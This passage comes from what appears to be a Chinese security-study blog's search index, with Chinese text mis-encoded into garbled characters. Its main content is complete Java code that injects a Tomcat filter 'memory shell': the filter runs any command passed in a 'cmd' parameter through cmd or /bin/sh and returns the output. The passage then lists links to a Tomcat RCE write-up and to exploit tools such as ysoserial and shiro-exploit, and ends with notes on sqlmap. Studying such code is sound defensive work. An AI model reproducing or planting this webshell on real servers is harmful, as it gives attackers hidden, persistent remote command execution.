class="hljs-comment">//ä»ApplicationContextä¸­è·å–StandardContextå¯¹è±¡</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>            stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br><br>            <span class="hljs-comment">//ä»StandardContextä¸­è·å¾—filterConfigsè¿™ä¸ªmapå¯¹è±¡</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>            Configs.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br><br>            <span class="hljs-comment">//å¦‚æœè¿™ä¸ªè¿‡æ»¤å™¨åå­—æ²¡æœ‰æ³¨å†Œè¿‡</span><br>            <span class="hljs-keyword">if</span> (filterConfigs.get(name) == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">//è‡ªå®šä¹‰ä¸€ä¸ªFilterå¯¹è±¡</span><br>                <span class="hljs-type">Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Filter</span>() &#123;<br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>                    &#125;<br><br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>                        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) servletRequest;<br>                        <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> resp.getWriter();<br>                            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>                            String[] commands = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">3</span>];<br>                            <span class="hljs-type">String</span> <span class="hljs-variable">charsetName</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;window&quot;</span>) ? <span class="hljs-string">&quot;GBK&quot;</span>:<span class="hljs-string">&quot;UTF-8&quot;</span>;<br>                            <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="hljs-string">&quot;WIN&quot;</span>)) &#123;<br>                                commands[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;cmd&quot;</span>;<br>                                commands[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;/c&quot;</span>;<br>                            &#125; <span class="hljs-keyword">else</span> &#123;<br>                                commands[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>                                commands[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-c&quot;</span>;<br>                            &#125;<br>                            commands[<span class="hljs-number">2</span>] = cmd;<br>                            <span class="hljs-keyword">try</span> &#123;<br>                                writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;println&quot;</span>, String.class).invoke(writer, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next());<br>                                writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;flush&quot;</span>).invoke(writer);<br>                                writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;close&quot;</span>).invoke(writer);<br>                                <span class="hljs-keyword">return</span>;<br>                            &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) &#123;<br>                                e.printStackTrace();<br>                            &#125;<br><br>                        &#125;<br>                        filterChain.doFilter(servletRequest, servletResponse);<br>                    &#125;<br><br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>                    &#125;<br><br>                &#125;;<br><br>                <span class="hljs-comment">//åˆ›å»ºFilterDefå¯¹è±¡ å¹¶æ·»åŠ  filterå¯¹è±¡ï¼Œfiltername, filterç±»</span><br>                <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>                filterDef.setFilter(filter);<br>                filterDef.setFilterName(name);<br>                filterDef.setFilterClass(filter.getClass().getName());<br>                <span class="hljs-comment">//é€šè¿‡addFilterDefæ–¹æ³•æ·»åŠ  filterDef æ–¹æ³•</span><br>                standardContext.addFilterDef(filterDef);<br><br>                <span class="hljs-comment">//åˆ›å»ºFilterMapå¯¹è±¡ï¼Œå¹¶æ·»åŠ  filteræ˜ å°„ï¼Œfiltername</span><br>                <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>                filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>                filterMap.setFilterName(name);<br>                <span class="hljs-comment">//è¿™ä¸ªä¸è¦å¿˜è®°äº†</span><br>                filterMap.setDispatcher(DispatcherType.REQUEST.name());<br><br>                <span class="hljs-comment">//é€šè¿‡addFilterMapBeforeæ–¹æ³•æ·»åŠ filterMapå¯¹è±¡</span><br>                standardContext.addFilterMapBefore(filterMap);<br><br>                <span class="hljs-comment">//é€šè¿‡å‰é¢è·å–çš„filtermapsçš„putæ–¹æ³•æ”¾å…¥filterConfig</span><br>                <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);<br>                constructor.setAccessible(<span class="hljs-literal">true</span>);<br>                <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);<br><br>                filterConfigs.put(name, filterConfig);<br><br>                <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> resp.getWriter();<br>                out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br>            &#125;<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="tomcatä¸­é—´ä»¶æ¼æ´"><a href="#tomcatä¸­é—´ä»¶æ¼æ´" class="headerlink" title="tomcatä¸­é—´ä»¶æ¼æ´"></a>tomcatä¸­é—´ä»¶æ¼æ´</h3><ul><li><p>æœ€æ–°RCEæ¼æ´</p><p><a href="https://www.freebuf.com/vuls/425025.html">CVE-2025-24813 RCEå¤ç° - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p></li></ul><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p><a href="https://mp.weixin.qq.com/s/5hYQQBRhdoU5yxXMsDmClA">è®°ä¸€æ¬¡å¼€æºcmsçš„Javaä»£å®¡ (qq.com)</a></p><h3 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h3><ul><li>Beynd Compareï¼šæ–‡ä»¶å¯¹æ¯”å·¥å…·ï¼Œå¯¹æ¯”ä¸¤ä¸ªæ–‡ä»¶æ‰¾åˆ°ä¸åŒç‰ˆæœ¬ä»£ç çš„å·®åˆ«</li><li>jndiæ³¨å…¥å·¥å…·ï¼šJNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</li><li>shiroååºåˆ—åŒ–å·¥å…·ï¼š<a href="https://github.com/Ares-X/shiro-exploit">https://github.com/Ares-X/shiro-exploit</a></li><li>ååºåˆ—åŒ–å·¥å…·ï¼šysoserial   <a href="https://blog.csdn.net/st3pby/article/details/135111050">Javaååºåˆ—åŒ–å·¥å…·ysoserialä½¿ç”¨-CSDNåšå®¢</a></li></ul><h3 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h3><ul><li><p>ä½¿ç”¨sqlmapæ—¶ç»å¸¸æ— æ³•æµ‹å‡ºæ³¨å…¥ç‚¹</p></li><li><p>å°è¯•ç½‘ä¸Šæ–¹æ³•ä¿®æ”¹æºä»£ç </p><p><img src="E:\aç½‘å®‰\ç¬”è®°\java\æ³¨å…¥ç‚¹.png"></p><p>å‘ç°æ­¤ä»£ç æ˜¯æ§åˆ¶404çš„å“åº”ç»“æœçš„ï¼Œæ³¨é‡Šæ‰ä¼šè®©sqlmapå¼ºè¡Œæ£€æµ‹æ³¨å…¥ç‚¹</p></li><li><p>é—®é¢˜æœªè§£å†³ï¼Œä¾æ—§æ— æ³•æµ‹å‡ºæ³¨å…¥ç‚¹</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
